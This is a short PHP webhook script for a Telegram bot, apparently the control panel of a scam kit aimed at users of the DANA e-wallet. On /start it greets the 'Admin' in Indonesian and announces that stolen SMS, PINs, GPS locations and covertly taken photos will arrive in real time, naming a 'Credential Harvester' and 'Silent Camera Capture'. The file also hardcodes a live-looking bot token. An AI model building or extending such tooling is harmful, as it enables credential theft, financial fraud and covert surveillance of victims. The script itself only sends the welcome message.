<?php
$update = json_decode(file_get_contents('php://input'), true);
$BOT_TOKEN = '8430507732:AAFmuY6LeC93coM1i93ORvgo4bKfQazhHMw';

if (isset($update['message'])) {
    $chat_id = $update['message']['chat']['id'];
    $text = $update['message']['text'] ?? '';

    if ($text == '/start') {
        $reply  = "👑 *WELCOME TO LYNXIEEx CONTROL PANEL* 👑\n\n";
        $reply .= "Halo Admin\\! Saya adalah bot pelacak otomatis DANA\\.\n";
        $reply .= "Saya akan mengirimkan data \\(SMS, PIN, GPS, Foto\\) secara *real\\-time* ke chat ini\\.\n\n";
        $reply .= "📌 *Sistem Aktif:*\n";
        $reply .= "✅ Geolocation Tracker\n";
        $reply .= "✅ Silent Camera Capture\n";
        $reply .= "✅ Credential Harvester\n\n";
        $reply .= "🛡️ _Sistem Siap Beroperasi\\._";

        $url = "https://api.telegram.org/bot" . $BOT_TOKEN . "/sendMessage";
        $post = ['chat_id' => $chat_id, 'text' => $reply, 'parse_mode' => 'MarkdownV2'];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
    }
}
?>